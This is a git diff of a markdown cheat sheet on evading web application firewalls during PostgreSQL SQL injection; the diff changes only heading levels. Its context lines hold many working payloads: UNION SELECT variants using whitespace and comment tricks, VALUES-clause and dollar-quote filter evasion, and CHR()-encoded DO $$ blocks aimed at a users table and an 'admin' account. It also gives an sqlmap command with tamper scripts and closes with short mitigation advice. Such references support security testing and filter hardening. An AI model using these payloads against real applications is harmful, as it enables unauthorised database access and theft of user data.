@@ -7,13 +7,11 @@ tags: ["bypass", "WAF", "obfuscation", "filter evasion"]
 lastUpdated: 2025-12-15
 ---
 
-## Fuzzing and Obfuscation
-
 Modern web applications often employ Web Application Firewalls (WAFs) and other security measures to detect and block SQL injection attempts. Fuzzing and obfuscation techniques can help bypass these protections by disguising SQL injection payloads.
 
 All techniques tested on PostgreSQL 12.x and 16.x unless noted otherwise.
 
-### Comment Variations
+## Comment Variations
 
 PostgreSQL supports multiple comment styles:
 
@@ -38,7 +36,7 @@ SELECT /* outer /* nested */ comment */ username FROM users
 SEL/**/ECT username FR/**/OM users  -- Syntax error!
 ```
 
-### Whitespace Alternatives
+## Whitespace Alternatives
 
 PostgreSQL accepts only **5 characters** as whitespace (tested across Unicode range 0x0000-0xFFFF):
 
@@ -61,7 +59,7 @@ SELECT%09username%0AFROM%0Dusers
 0 UNION%0ASELECT 1,2,3,4--
 ```
 
-### Characters That Don't Require Space After SELECT
+## Characters That Don't Require Space After SELECT
 
 Certain characters can immediately follow `SELECT` without whitespace:
 
@@ -87,7 +85,7 @@ SELECT(username)FROM users
 0 UNION(SELECT+1,'test','x','x')--
 ```
 
-### Parentheses as Space Alternative
+## Parentheses as Space Alternative
 
 Parentheses eliminate the need for whitespace in many contexts:
 
@@ -102,7 +100,7 @@ SELECT(username)FROM(users)WHERE(id=1)
 0 UNION(SELECT * FROM(SELECT 1,$$test$$,$$x$$,$$x$$)t)--
 ```
 
-### VALUES Clause (Avoids SELECT Keyword!)
+## VALUES Clause (Avoids SELECT Keyword!)
 
 The `VALUES` clause completely bypasses `UNION SELECT` pattern matching:
 
@@ -121,7 +119,7 @@ The `VALUES` clause completely bypasses `UNION SELECT` pattern matching:
 0 UNION VALUES((SELECT id FROM users LIMIT 1),(SELECT username FROM users LIMIT 1),$$x$$,$$x$$)--
 ```
 
-### Dollar Quote Obfuscation
+## Dollar Quote Obfuscation
 
 PostgreSQL's dollar quoting bypasses single quote filters:
 
@@ -151,7 +149,7 @@ SELECT * FROM users WHERE username = $💀$admin$💀$
 - Tags are case-sensitive (`$Tag$` ≠ `$tag$`)
 - Empty tags are valid (`$$` with no tag name)
 
-### String Representation Alternatives
+## String Representation Alternatives
 
 Multiple ways to represent strings without standard quotes:
 
@@ -174,7 +172,7 @@ SELECT U&'!0061dmin' UESCAPE '!'
 SELECT convert_from('\x61646d696e', 'UTF8')
 ```
 
-### Numeric Representation
+## Numeric Representation
 
 Bypass filters that match specific integers:
 
@@ -199,7 +197,7 @@ Bypass filters that match specific integers:
 0e0 UNION SELECT 1,2,3,4--
 ```
 
-### Type Casting for Bypass
+## Type Casting for Bypass
 
 ```sql
 -- Multiple type name variations
@@ -216,7 +214,7 @@ Bypass filters that match specific integers:
 ?id=ANY('{1}'::int[])
 ```
 
-### Boolean Representation Bypasses
+## Boolean Representation Bypasses
 
 Many representations of TRUE/FALSE for bypassing `1=1` filters:
 
@@ -236,9 +234,9 @@ true, 't'::boolean, 'yes'::boolean, 'on'::boolean, 1::boolean
 false, 'f'::boolean, 'no'::boolean, 'off'::boolean, 0::boolean
 ```
 
-### PostgreSQL-Specific Operators
+## PostgreSQL-Specific Operators
 
-#### Array Operators
+### Array Operators
 
 ```sql
 SELECT * FROM users WHERE ARRAY[id] @> ARRAY[1]
@@ -246,7 +244,7 @@ SELECT * FROM users WHERE id = ANY('{1,2,3}'::int[])
 SELECT * FROM users WHERE id = (ARRAY[1,2,3])[1]
 ```
 
-#### Pattern Matching Alternatives
+### Pattern Matching Alternatives
 
 ```sql
 -- Instead of LIKE
@@ -256,7 +254,7 @@ SELECT * FROM users WHERE id = (ARRAY[1,2,3])[1]
 1 OR STRPOS(username, $$admin$$) > 0--
 ```
 
-#### Schema-Qualified Functions
+### Schema-Qualified Functions
 
 Prefix with `pg_catalog.` to bypass function name filters:
 
@@ -265,7 +263,7 @@ Prefix with `pg_catalog.` to bypass function name filters:
 1 OR pg_catalog.upper(username) = $$ADMIN$$--
 ```
 
-### DO $$ Block WAF Bypass
+## DO $$ Block WAF Bypass
 
 Execute dynamic SQL with CHR() encoding to bypass keyword filters:
 
@@ -302,7 +300,7 @@ FROM regexp_split_to_table('SELECT', '') AS ch;
 -- Returns: CHR(83)||CHR(69)||CHR(76)||CHR(69)||CHR(67)||CHR(84)
 ```
 
-### Complete Bypass Examples
+## Complete Bypass Examples
 
 ```sql
 -- No space after UNION, no SELECT keyword
@@ -324,7 +322,7 @@ FROM regexp_split_to_table('SELECT', '') AS ch;
 1 OR username=(CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110))--
 ```
 
-### Automated Testing
+## Automated Testing
 
 ```bash
 # SQLMap with tamper scripts
@@ -337,7 +335,7 @@ sqlmap -u "http://target/page?id=1" --tamper=space2comment,charencode
 # - randomcase: Randomize keyword case
 ```
 
-### Mitigation
+## Mitigation
 
 1. Use parameterized queries (prepared statements)
 2. Implement input validation with whitelist approach
